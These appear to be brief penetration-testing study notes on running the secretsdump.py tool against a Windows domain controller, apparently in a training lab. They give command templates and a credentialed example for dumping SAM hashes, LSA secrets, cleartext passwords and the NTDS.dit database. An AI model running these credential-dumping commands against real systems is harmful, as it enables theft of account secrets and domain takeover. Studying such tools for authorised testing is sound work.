# 1. installation

# 2. usage
- secretsdump.py <domain>/<user>:<password>@<ip address>
example: secretsdump.py MARVEL.local/fcastle:'Password1'@10.0.0.25

dumps out:
- SAM hashes
- cached domain logon info
- LSA secrets
- passwords in clear text
- wdigest
- logon passwords

- secretsdump.py <domain>/<user>:'<password>'@<ip address> -just-dc-ntlm
dumps the NTDS.dit